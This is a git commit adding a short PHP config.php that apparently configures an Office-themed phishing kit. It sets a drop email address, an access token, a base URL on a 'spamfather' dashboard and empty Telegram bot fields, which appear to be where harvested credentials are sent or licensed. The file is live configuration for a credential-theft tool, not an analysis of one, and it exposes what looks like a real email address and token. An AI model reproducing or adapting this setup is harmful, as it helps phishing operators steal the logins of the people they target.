76902ce8f128c6b19692bcc1dee57a19fa78656a
aparticabal <152834729+aparticabal@users.noreply.github.com>
2023-12-03 22:16:24 -0800

    Add files via upload

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php
+$email ="officecookies3@gmail.com";
+$token ="7F687-767CC-F20FC-EA1C9-DC4A5-ADC23-26-16-89589-437";
+$base  ="https://dashboard.spamfather.com/web/";
+$domain= $server=$_SERVER['SERVER_NAME'];
+$page="Office";
+$telegramId=" ";
+$telegarmToken=" ";
+?>
